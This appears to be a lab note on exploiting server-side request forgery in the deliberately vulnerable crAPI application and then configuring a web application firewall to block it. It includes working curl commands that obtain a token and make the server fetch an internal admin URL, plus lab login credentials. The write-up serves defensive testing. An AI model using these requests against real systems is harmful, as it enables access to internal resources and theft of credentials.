## Overview:
Using SSRF vulnerability to manipulate the requests made by a web application to access resources on internal systems "10.1.10.105/admin" that we should not have access to.

### Setup:
Testing with two hostnames 
	**crapi.local** |  crAPI Application protected by WAF
	**10.1.10.104** | crAPI Application Without WAF

### Users:
**Malicious User:** malicious@example.com/F5@Pass50 
## Discovering SSRF
- Login with user malicious
- When we visited the dashboard, we found the “<font color="#ffc000">Contact Mechanic</font>” Button
![[Pasted image 20260830155313.png|607]]
We found that the request had a parameter in the body called `mechanic_api` which contains a link to visit , so we could try to add external uri and check the response
![[Pasted image 20260830155443.png|764]]

## SSRF without WAF
try to access an external web app
```python unfold ln:false unwrap title:"code"
##login and get access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
##use access token to test SSRF
curl -X POST  http://10.1.10.104/workshop/api/merchant/contact_mechanic -d '{"mechanic_code":"TRAC_JHN","problem_details":"call me","vin":"8PK1LM7PB5YV9EEG0","mechanic_api":"https://google.com","repeat_request_if_failed":false,"number_of_repeats":1}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260830171109.png|826]]
that confirms that SSRF exists.
- Accessing an internal resource 10.1.10.105/admin
with more enumeration and directory indexing the attacker find admin directory on different internal server "10.1.10.105"
![[Pasted image 20260831142255.png|843]]
exposed SSH credentials for another internal server..

## SSRF WAF protection 
### Configuration:
- JSON parse parameters
as parameter 'mechinic_api' is in JSON, we need to make sure WAF parse JSON parameters 
![[Pasted image 20260831142723.png|778]]

- configure `mechnic_api` parameter
![[Pasted image 20260831143711.png|749]]

- enforce SSRF
![[Pasted image 20260831143807.png|784]]

check SSRF denied hosts
![[Pasted image 20260831143902.png|832]]

### validation 
```zsh unfold ln:false unwrap title:"code"
##login and export access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
#use exported access token 
curl -X POST  http://crapi.local/workshop/api/merchant/contact_mechanic -d '{"mechanic_code":"TRAC_JHN","problem_details":"call me","vin":"8PK1LM7PB5YV9EEG0","mechanic_api":"http://10.1.10.105/admin","repeat_request_if_failed":false,"number_of_repeats":1}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

![[Pasted image 20260831144004.png|896]]
![[Pasted image 20260831144143.png|759]]